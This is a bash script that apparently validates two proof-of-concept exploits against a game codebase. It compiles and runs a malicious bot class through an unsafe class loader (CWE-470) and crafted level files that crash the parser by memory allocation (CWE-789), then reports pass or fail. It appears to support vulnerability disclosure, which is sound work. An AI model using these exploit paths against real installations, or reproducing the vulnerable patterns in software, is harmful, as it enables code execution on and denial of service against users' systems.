#!/usr/bin/env bash
# Compile and run both validation PoCs. Requires a JDK on PATH.
set -uo pipefail
export PATH="/opt/homebrew/opt/openjdk/bin:$PATH"
HERE="$(cd "$(dirname "$0")" && pwd)"
PASS=0; FAIL=0
ok(){ echo "  RESULT: PASS - $1"; PASS=$((PASS+1)); }
no(){ echo "  RESULT: FAIL - $1"; FAIL=$((FAIL+1)); }

echo "JDK: $(java -version 2>&1 | head -1)"
echo
echo "==================================================================="
echo "PoC 1: arbitrary code execution via AI/bot class loading (CWE-470)"
echo "==================================================================="
d="$HERE/poc1_code_loading"; marker="${TMPDIR:-/tmp}/apogames_poc1_pwned.txt"
rm -f "$marker"
javac -d "$d/build" "$d/MaliciousAI.java" "$d/VulnerableLoader.java"
# Attacker's class sits in a directory the victim points the loader at:
java -cp "$d/build" VulnerableLoader "$d/build" MaliciousAI
if [ -f "$marker" ]; then ok "attacker code ran, marker written: $marker"; cat "$marker" | sed 's/^/    /';
else no "no marker produced"; fi

echo
echo "==================================================================="
echo "PoC 2: DoS via unchecked allocation in level parser (CWE-789)"
echo "==================================================================="
d="$HERE/poc2_level_alloc"
javac -d "$d/build" "$d/VulnerableLevelParser.java" "$d/LevelCrafter.java"

java -cp "$d/build" LevelCrafter neg "$d/build/neg.level"
neg_out=$(java -cp "$d/build" -Xmx64m VulnerableLevelParser "$d/build/neg.level" 2>&1 || true)
if grep -q "NegativeArraySizeException" <<<"$neg_out"; then
  ok "tiny crafted file triggered NegativeArraySizeException"
else no "negative-size case did not crash as expected"; fi

java -cp "$d/build" LevelCrafter oom "$d/build/oom.level"
oom_out=$(java -cp "$d/build" -Xmx64m VulnerableLevelParser "$d/build/oom.level" 2>&1 || true)
if grep -qE "OutOfMemoryError|Requested array size" <<<"$oom_out"; then
  ok "tiny crafted file exhausted a 64 MB heap (OutOfMemoryError)"
else no "OOM case did not crash as expected"; fi

echo
echo "==================================================================="
echo "SUMMARY: $PASS passed, $FAIL failed"
echo "==================================================================="
[ "$FAIL" -eq 0 ]
